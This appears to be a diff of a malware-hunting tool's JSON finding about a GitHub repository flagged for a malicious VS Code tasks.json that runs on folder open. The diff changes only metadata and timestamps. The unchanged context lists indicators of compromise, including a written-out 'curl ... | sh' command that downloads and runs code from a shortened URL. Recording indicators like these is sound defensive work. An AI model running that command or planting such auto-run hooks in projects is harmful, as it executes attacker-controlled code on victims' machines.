@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:mohamedeturki/shigud-clone",
     "kind": "repository",
+    "family": "",
     "id": "mohamedeturki/shigud-clone",
     "url": "https://github.com/mohamedeturki/shigud-clone",
     "registry": "github",
@@ -20,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 15)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/mohamedeturki_shigud-clone.json",
     "reviewer_decision": "",
     "notes": ""
@@ -82,7 +83,7 @@
     "evidence_references": "https://github.com/mohamedeturki/shigud-clone/blob/ac78bef4962887be43ac5bce3573991aa870ffc4/.vscode/tasks.json\nhttps://github.com/mohamedeturki/shigud-clone/blob/ac78bef4962887be43ac5bce3573991aa870ffc4/vite.config.ts#L5\nhttps://github.com/mohamedeturki/shigud-clone/blob/ac78bef4962887be43ac5bce3573991aa870ffc4/vite.config.ts#L15\nhttps://github.com/mohamedeturki/shigud-clone/blob/ac78bef4962887be43ac5bce3573991aa870ffc4/prettier.cjs#L3",
     "verified_iocs": "gurucooldown.short.gy\nhttps://gurucooldown.short.gy/kWsiMe4m\nhttps://gurucooldown.short.gy/kWsiMe4l\nhttps://gurucooldown.short.gy/kWsiMe4w\ncurl 'https://gurucooldown.short.gy/kWsiMe4m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
